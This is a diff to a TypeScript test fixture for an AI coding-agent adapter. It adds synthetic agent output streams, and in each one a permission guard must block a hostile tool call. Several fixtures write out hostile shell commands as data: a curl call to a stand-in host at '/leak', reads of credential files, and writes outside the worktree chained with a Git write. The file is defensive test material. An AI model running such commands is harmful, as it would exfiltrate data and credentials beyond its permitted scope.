@@ -25,7 +25,11 @@
  * `command` parameter key, which is hypothetical (adapter.ts `parseEvent`); without the Git write the same stream
  * ends `ok` (pinned in `antigravity.test.ts`). The streams "after the result line" put the same hostile call after a
  * clean `SUCCESS` envelope (an order not recorded, as Grok Build, Cursor and OpenCode): a trailing tool call is never a
- * success, and the Git write keeps the guard's `PERMISSION_BLOCKED`.
+ * success, and the Git write keeps the guard's `PERMISSION_BLOCKED`. Every blocked category has its soft-denied, guarded
+ * and trailing streams at exit 0 and at exit 1, a guarded stream with no `result` line at exit 0 (unrecorded, fail
+ * closed as OpenCode's Q-85) and, for the network call, a guarded stream ending in an `ERROR` envelope with no denial.
+ * An unflagged trailing tool call ends `OUTPUT_PROTOCOL_ERROR`; it is not a hostile category stream here (those must
+ * end blocked), so `src/adapters/antigravity/antigravity.test.ts` pins it.
  */
 
 import { AntigravityAdapter } from "../../../src/adapters/antigravity/adapter.js";
@@ -147,6 +151,29 @@ const trailing = (name: string, category: HostileStream["category"], command: st
   ],
 });
 
+/**
+ * Hypothetical end (fail closed, as OpenCode's Q-85): a hostile call chained with a Git write and no `result` line at
+ * exit 0. Every recorded run ended on `result` (C4); without one the run is never a success, and the guard's verdict
+ * keeps its own code.
+ */
+const noResult = (name: string, category: HostileStream["category"], command: string) => ({
+  name: `${name} chained with a Git write, no result line at exit 0`,
+  category,
+  exitCode: 0,
+  failureCode: "PERMISSION_BLOCKED" as const,
+  lines: [
+    META(`${name} chained with a Git write; the stream ends without a result line`, 0),
+    INIT,
+    ...shell(`${command} && ${GIT_WRITE}`),
+  ],
+});
+
+/** Hypothetical: an `ERROR` envelope at exit 1 with no `denied_actions` (no such run was recorded). */
+const ERROR_RESULT = JSON.stringify({
+  event: "result",
+  result: { conversation_id: SID, status: "ERROR", response: "", error: "synthetic tool failure", usage: USAGE },
+});
+
 const antigravityCase: AdapterLegCase = {
   provider: "antigravity",
   profile: PRIVILEGED_BYPASS_PROFILE,
@@ -246,6 +273,30 @@ const antigravityCase: AdapterLegCase = {
       ],
     },
     {
+      name: "write outside the worktree, ERROR at exit 1",
+      category: "out_of_worktree_write",
+      exitCode: 1,
+      failureCode: "PERMISSION_BLOCKED",
+      lines: [
+        META("write_to_file outside the worktree, ERROR envelope", 1),
+        INIT,
+        ...toolStep(1, "write_to_file", { path: fx.outsideSentinel }),
+        deniedErrorResult(DENIED_WRITE),
+      ],
+    },
+    {
+      name: "shell network call, ERROR at exit 1",
+      category: "network",
+      exitCode: 1,
+      failureCode: "PERMISSION_BLOCKED",
+      lines: [
+        META("shell network call, ERROR envelope", 1),
+        INIT,
+        ...shell("curl https://example.invalid/leak"),
+        deniedErrorResult(DENIED_COMMAND),
+      ],
+    },
+    {
       name: "shell network call, recorded shape (no tool parameters)",
       category: "network",
       exitCode: 0,
@@ -262,9 +313,26 @@ const antigravityCase: AdapterLegCase = {
       guarded("shell write outside the worktree", "out_of_worktree_write", `touch ${fx.outsideSentinel}`, exit),
       guarded("shell network call", "network", "curl https://example.invalid/leak", exit),
     ]),
-    trailing("shell read of a credential path", "credential_read", `cat ${fx.codexAuthPath}`, 0),
-    trailing("shell write outside the worktree", "out_of_worktree_write", `touch ${fx.outsideSentinel}`, 0),
-    trailing("shell network call", "network", "curl https://example.invalid/leak", 1),
+    ...[0, 1].flatMap((exit) => [
+      trailing("shell read of a credential path", "credential_read", `cat ${fx.codexAuthPath}`, exit),
+      trailing("shell write outside the worktree", "out_of_worktree_write", `touch ${fx.outsideSentinel}`, exit),
+      trailing("shell network call", "network", "curl https://example.invalid/leak", exit),
+    ]),
+    noResult("shell read of a credential path", "credential_read", `cat ${fx.claudeCredentialsPath}`),
+    noResult("shell write outside the worktree", "out_of_worktree_write", `touch ${fx.outsideSentinel}`),
+    noResult("shell network call", "network", "curl https://example.invalid/leak"),
+    {
+      name: "shell network call chained with a Git write, then an ERROR envelope with no denial, exit 1",
+      category: "network",
+      exitCode: 1,
+      failureCode: "PERMISSION_BLOCKED",
+      lines: [
+        META("hostile command chained with a Git write, then an ERROR envelope without denied_actions", 1),
+        INIT,
+        ...shell(`curl https://example.invalid/leak && ${GIT_WRITE}`),
+        ERROR_RESULT,
+      ],
+    },
     {
       name: "only unknown event kinds, clean exit",
       category: "unknown_events",
@@ -274,6 +342,18 @@ const antigravityCase: AdapterLegCase = {
         META("Event kinds below are invented; the adapter must report them unknown.", 0),
         JSON.stringify({ event: "synthetic_unknown_kind", conversation_id: SID }),
         JSON.stringify({ event: "synthetic_another_unknown", conversation_id: SID }),
+      ],
+    },
+    {
+      // Exit 1 is not an expected exit code, so the run ends TOOL_FAILURE; never success.
+      name: "only unknown event kinds and a line without an event field, exit 1",
+      category: "unknown_events",
+      exitCode: 1,
+      failureCode: "TOOL_FAILURE",
+      lines: [
+        META("Event kinds below are invented; the adapter must report them unknown.", 1),
+        JSON.stringify({ event: "synthetic_unknown_kind", conversation_id: SID }),
+        JSON.stringify({ conversation_id: SID, status: "SUCCESS" }),
       ],
     },
   ],
